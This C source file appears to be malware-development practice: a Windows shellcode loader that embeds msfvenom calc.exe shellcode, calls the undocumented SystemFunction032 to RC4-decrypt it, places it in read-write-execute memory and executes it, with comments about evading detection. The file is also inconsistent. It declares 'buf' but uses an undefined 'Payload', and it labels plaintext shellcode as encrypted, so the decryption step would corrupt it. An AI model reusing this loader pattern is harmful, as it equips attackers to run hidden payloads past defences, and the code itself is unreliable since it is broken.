#include <Windows.h>
#include <stdio.h>


// generated with msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o payload.bin and then encrypted rc4.py
// xored with 0xAA
// stored in .data section
// RC4 key: ILOVEMALWARE
unsigned char Key[] = { 'I', 'L', 'O', 'V', 'E', 'M', 'A', 'L', 'W', 'A', 'R', 'E' };

// Encrypted payload with RC4
unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

// Windows NTAPI SystemFunction032 (undocumented) -- https://doxygen.reactos.org/df/d13/sysfunc_8c.html#a66d55017b8625d505bd6c5707bdb9725
// the SystemFunction032 function is an implementation of the RC4 encryption algorithm. It takes a pointer to a USTRING structure that contains the data to be encrypted or decrypted, and a pointer to a key that is used for the encryption or decryption process. The function modifies the data in place, meaning that the original data is overwritten with the encrypted or decrypted version.
// since it's an undocumented function, we have to declare the USTRING structure ourselves
typedef struct
{
	DWORD	Length;         // Size of the data to encrypt or decrypt
	DWORD	MaximumLength;  // Max size of the data to encrypt or decrypt, although often its the same as Length (USTRING.Length = USTRING.MaximumLength = X)
	PVOID	Buffer;         // The base address of the data to encrypt or decrypt

} USTRING;
// now that's the structure is declared we can retreive the SystemFunction032 addr with GetProcAddress

// since the name "SystemFunction032" will be hardcoded in the binary, maybe a bit of opsec is needed
// definition of fnSystemFunction032
typedef NTSTATUS(WINAPI* fnSystemFunction032)(
	USTRING* Data,
	USTRING* Key
	);

int main() {

	HRSRC		hRsrc = NULL;
	HGLOBAL		hGlobal = NULL;
	PVOID		pPayloadAddress = NULL;
	SIZE_T		sPayloadSize = NULL;
	NTSTATUS STATUS = NULL;

	// declare the RC4 key and the encrypted payload
	USTRING stData = {
	.Buffer = Payload,
	.Length = sizeof(Payload),
	.MaximumLength = sizeof(Payload)
	};

	USTRING	stKey = {
		.Buffer = Key,
		.Length = sizeof(Key),
		.MaximumLength = sizeof(Key)
	};

	printf("RC4 Encryption example!!!! \n");
	//printf("encrypted Payload addr: 0x%p\n", shellcode);

	// load in memory the DLL that contains the SystemFunction032 function, in this case Advapi32.dll, and get the address of the function
	HMODULE hAdvapi32 = LoadLibraryA("Advapi32");

	PVOID pAddress = GetProcAddress(hAdvapi32, "SystemFunction032");
	if (pAddress == NULL) {
		printf("GetProcAddress failed with error code: %d\n", GetLastError());
		return 1;
	}

	// typecasting the address of the function to a function pointer of the same type as SystemFunction032
	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)pAddress;
	printf("SystemFunction032 addr: 0x%p\n", pAddress);

	if ((STATUS = SystemFunction032(&stData, &stKey)) != 0x0) {
		printf("SystemFunction032 FAILED With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("decryption okayy !\n");

	
	PVOID pExec = VirtualAlloc(NULL, sizeof(Payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pExec == NULL) {
		printf("VirtualAlloc failed with error code: %d\n", GetLastError());
		return 1;
	}

	// we cannot execute from .data because its RO
	memcpy(pExec, Payload, sizeof(Payload));

	void (*pExecFunc)() = (void(*)())(uintptr_t)pExec;

	// exec
	pExecFunc();
	return 0;
}

